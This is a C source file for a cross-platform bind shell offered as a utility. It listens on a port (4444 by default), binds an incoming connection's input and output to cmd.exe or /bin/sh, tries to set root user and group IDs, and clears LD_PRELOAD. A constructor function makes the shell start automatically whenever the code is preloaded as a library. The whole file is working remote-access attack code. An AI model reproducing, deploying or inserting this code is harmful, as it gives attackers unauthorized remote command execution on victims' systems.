#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#ifndef SHUT_RDWR
#define SHUT_RDWR SD_BOTH
#endif
typedef SOCKET sock_t;
#define CLOSESOCK closesocket
#define SOCK_INVALID INVALID_SOCKET
#define SOCK_ERROR(s) ((s) == INVALID_SOCKET)
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
typedef int sock_t;
#define CLOSESOCK close
#define SOCK_INVALID (-1)
#define SOCK_ERROR(s) ((s) < 0)
#endif

#ifdef _WIN32
static void sock_startup(void) {
    static int inited = 0;
    if (!inited) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
        inited = 1;
    }
}
#else
static void sock_startup(void) {}
#endif

static void bind_shell(int port) {
    fprintf(stderr, "[+] Starting bind shell on port %d\n", port);

    sock_startup();

    sock_t sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (SOCK_ERROR(sockfd)) {
        fprintf(stderr, "[-] Failed to create socket\n");
        return;
    }

    int opt = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "[-] Failed to bind to port %d\n", port);
        CLOSESOCK(sockfd);
        return;
    }

    if (listen(sockfd, 1) < 0) {
        fprintf(stderr, "[-] Failed to listen\n");
        CLOSESOCK(sockfd);
        return;
    }

    fprintf(stderr, "[+] Listening on 0.0.0.0:%d\n", port);
    fprintf(stderr, "[+] Waiting for connection...\n");

    sock_t client = accept(sockfd, NULL, NULL);
    if (SOCK_ERROR(client)) {
        fprintf(stderr, "[-] Failed to accept connection\n");
        CLOSESOCK(sockfd);
        return;
    }

    fprintf(stderr, "[+] Connection accepted, spawning shell\n");

#ifdef _WIN32
    /* Spawn cmd.exe with stdio redirected to the client socket via CreateProcess */
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput  = (HANDLE)client;
    si.hStdOutput = (HANDLE)client;
    si.hStdError  = (HANDLE)client;

    const char* comspec = getenv("COMSPEC");
    char cmdline[MAX_PATH];
    snprintf(cmdline, sizeof(cmdline), "%s", comspec ? comspec : "cmd.exe");

    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[-] CreateProcess failed (%lu)\n", (unsigned long)GetLastError());
        CLOSESOCK(client);
        CLOSESOCK(sockfd);
        return;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CLOSESOCK(client);
    CLOSESOCK(sockfd);
#else
    dup2(client, 0);
    dup2(client, 1);
    dup2(client, 2);
    close(client);
    close(sockfd);

    setreuid(0, 0);
    setregid(0, 0);
    chdir("/");

    unsetenv("LD_PRELOAD");

    execl("/bin/sh", "sh", NULL);
    fprintf(stderr, "[-] Failed to execute shell: %s\n", strerror(errno));
#endif
}

#ifndef _WIN32
__attribute__((constructor)) void init(void) {
    if (getenv("SHELL_BIND_ACTIVE")) return;
    if (getenv("SHELL_BIND_MAIN")) return;

    setenv("SHELL_BIND_ACTIVE", "1", 1);
    const char* port_str = getenv("BIND_PORT");
    int port = port_str ? atoi(port_str) : 4444;
    bind_shell(port);
}
#endif

#ifdef ENABLE_MAIN
int main(int argc, char *argv[]) {
#ifdef _WIN32
    _putenv("SHELL_BIND_MAIN=1");
    _putenv("SHELL_BIND_ACTIVE=1");
#else
    setenv("SHELL_BIND_MAIN", "1", 1);
    setenv("SHELL_BIND_ACTIVE", "1", 1);
#endif

    int port = 4444;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("shell-bind - Bind shell utility\n");
            printf("Usage: %s [options] [port]\n", argv[0]);
            printf("\nOptions:\n");
            printf("  -h, --help    Show this help message\n");
            printf("  -p <port>     Port to bind (default: 4444)\n");
            printf("\nExamples:\n");
            printf("  %s              # Bind on port 4444\n", argv[0]);
            printf("  %s 8080         # Bind on port 8080\n", argv[0]);
            printf("  %s -p 1337      # Bind on port 1337\n", argv[0]);
            printf("\nEnvironment:\n");
            printf("  BIND_PORT=<port>  Set bind port (fallback if no args)\n");
            return 0;
        } else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            port = atoi(argv[++i]);
        } else if (argv[i][0] != '-') {
            port = atoi(argv[i]);
        }
    }

    const char* env_port = getenv("BIND_PORT");
    if (argc == 1 && env_port) {
        port = atoi(env_port);
    }

    bind_shell(port);
    return 0;
}
#endif
